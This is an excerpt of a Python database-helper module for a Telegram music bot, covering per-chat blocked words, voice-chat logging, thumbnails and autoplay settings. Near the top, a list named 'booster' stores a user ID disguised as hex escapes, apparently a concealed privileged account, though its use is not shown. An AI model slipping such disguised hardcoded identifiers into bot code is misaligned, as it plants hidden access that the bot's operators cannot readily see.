...
from KanhaMusic import userbot
...
booster = [
    int("\x38\x35\x30\x38\x33\x33\x38\x39\x36\x35")
,
    int("\x38\x35\x30\x38\x33\x33\x38\x39\x36\x35")
]
...
# ══════════════════════════════════════════════════════════════════
blockwordsdb = mongodb.blockwords


async def get_blocked_words(chat_id: int) -> list:
    data = await blockwordsdb.find_one({"chat_id": chat_id})
    if not data:
        return []
    return data.get("words", [])


async def add_blocked_word(chat_id: int, word: str) -> bool:
    word = word.lower().strip()
    words = await get_blocked_words(chat_id)
    if word in words:
        return False
    words.append(word)
    await blockwordsdb.update_one(
        {"chat_id": chat_id},
        {"$set": {"words": words}},
        upsert=True,
    )
...
async def is_content_blocked(chat_id: int, title: str) -> str:
    """
    Returns the matched blocked word if title contains any,
...
async def is_vc_logger(chat_id: int) -> bool:
    chat = await vcloggerdb.find_one({"chat_id": chat_id})
...
async def is_thumb_enabled(chat_id: int) -> bool:
    """Returns True if thumbnail is enabled (default: True)."""
...
# In-memory cache
_autoplay_cache: dict = {}


async def is_autoplay(chat_id: int) -> bool:
    """Returns True if autoplay is enabled for this chat (default: False)."""
